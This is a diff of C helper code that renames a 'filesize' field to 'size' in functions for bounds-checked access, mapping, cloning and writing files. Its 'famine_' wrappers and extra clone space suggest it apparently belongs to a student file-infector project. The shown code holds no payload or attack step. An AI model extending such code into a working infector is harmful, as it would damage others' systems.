@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/05 06:32:25 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 12:38:58 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/12/11 01:28:10 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -26,7 +26,7 @@ __warn_unused_result
 void			*safe_accessor(const size_t offset, const size_t size, \
 				const struct safe_pointer info)
 {
-	if (offset + size > info.filesize || offset + size < offset)
+	if (offset + size > info.size || offset + size < offset)
 		return (NULL);
 	return (info.ptr + offset);
 }
@@ -35,7 +35,7 @@ bool			free_accessor(struct safe_pointer *info)
 {
 	if (info->ptr)
 	{
-		if (famine_munmap(info->ptr, info->filesize))
+		if (famine_munmap(info->ptr, info->size))
 			return errors(ERR_SYS, '1','1');
 	}
 	return true;
@@ -59,16 +59,16 @@ bool			original_accessor(struct safe_pointer *accessor, const char *filename)
 	if (famine_close(fd))
 		{return errors(ERR_SYS, '1','6');}
 
-	accessor->ptr      = ptr;
-	accessor->filesize = buf.st_size;
+	accessor->ptr  = ptr;
+	accessor->size = buf.st_size;
 	return true;
 }
 
 __warn_unused_result
 bool			clone_accessor(struct safe_pointer *accessor, const size_t original_filesize)
 {
-	accessor->filesize = original_filesize + MAX_EXT_SIZE;
-	accessor->ptr = famine_mmap(0, accessor->filesize, \
+	accessor->size = original_filesize + MAX_EXT_SIZE;
+	accessor->ptr  = famine_mmap(0, accessor->size, \
 		PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
 
 	if (accessor->ptr == MAP_FAILED)
@@ -85,7 +85,7 @@ bool			write_clone_file(const struct safe_pointer accessor, \
 	if (fd == -1)
 		return errors(ERR_SYS, '1','8');
 
-	if (famine_write(fd, accessor.ptr, accessor.filesize) == -1)
+	if (famine_write(fd, accessor.ptr, accessor.size) == -1)
 	{
 		famine_close(fd);
 		return errors(ERR_SYS, '1','9');
